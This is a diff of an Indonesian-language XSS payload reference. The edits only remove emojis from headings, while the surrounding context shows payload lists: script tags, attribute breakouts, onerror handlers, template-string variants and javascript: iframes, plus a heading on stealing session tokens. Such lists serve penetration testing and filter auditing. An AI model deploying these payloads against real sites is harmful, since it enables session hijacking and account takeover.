@@ -1,16 +1,16 @@
-# 📜 XSS (Cross-Site Scripting) — Payload Reference & Bypass List
+﻿# XSS (Cross-Site Scripting) — Payload Reference & Bypass List
 
 > **Tujuan:** Koleksi payload XSS (Reflected & Stored) untuk menguji kerentanan Cross-Site Scripting, bypass filter HTML/JavaScript, pencurian session/cookie, serta pencurian token otentikasi.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna tanpa sanitasi atau encoding di sisi server, sehingga skrip JavaScript arbitrer dieksekusi di browser korban.
 
 ---
 
-## ⚡ Quick One-Liners (Verifikasi Filter/Bypass Audit)
+## Quick One-Liners (Verifikasi Filter/Bypass Audit)
 
 > **Tujuan:** Digunakan untuk tes cepat apakah filter hanya menghapus satu jenis tag/handler atau ada bias/ketimpangan dalam sanitasi.
 
@@ -35,7 +35,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 <video><source src=x onerror=alert(17)></video><iframe src="javascript:alert(18)"></iframe>
 ```
 
-### 🔹 1. Basic `<script>` Tag Payloads
+### 1. Basic `<script>` Tag Payloads
 
 ```html
 <script>alert(1)</script>
@@ -46,7 +46,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-### 🔹 2. Tag & Attribute Breakout (Escape Form/Input Context)
+### 2. Tag & Attribute Breakout (Escape Form/Input Context)
 
 ```html
 "><script>alert(1)</script>
@@ -57,7 +57,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-### 🔹 3. Image Tag Event Handler Payloads (`onerror`)
+### 3. Image Tag Event Handler Payloads (`onerror`)
 
 ```html
 <img src=x onerror=alert(1)>
@@ -70,7 +70,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-### 🔹 4. Advanced & ES6 Template String Payloads
+### 4. Advanced & ES6 Template String Payloads
 
 ```html
 <img/src=x onError="`${x}`;alert(`xss`);">
@@ -81,7 +81,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-### 🔹 5. `<iframe>` & HTML5 Media Payloads (`<video>`, `<audio>`)
+### 5. `<iframe>` & HTML5 Media Payloads (`<video>`, `<audio>`)
 
 ```html
 <iframe src="javascript:alert(`xss`)">
@@ -94,7 +94,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-## 🔑 Exfiltrasi Sensitive Tokens & Session
+## Exfiltrasi Sensitive Tokens & Session
 
 | Target Data | Payload Example |
 |-------------|-----------------|
@@ -104,7 +104,7 @@ Cross-Site Scripting (XSS) terjadi ketika aplikasi menampilkan input pengguna ta
 
 ---
 
-## 🛠️ Tips Pengujian & Remediasi
+## Tips Pengujian & Remediasi
 
 1. **Test Vectors:** Mulai dari `<script>alert(1)</script>` sederhana, lalu tingkatkan ke atribut break `">`, event handler `<img src=x onerror=...>`, hingga pseudo-protocol `javascript:`.
 2. **Output Encoding:** Pastikan aplikasi meng-encode output HTML (`HTML Entity Encoding`) sebelum me-render input ke halaman web.
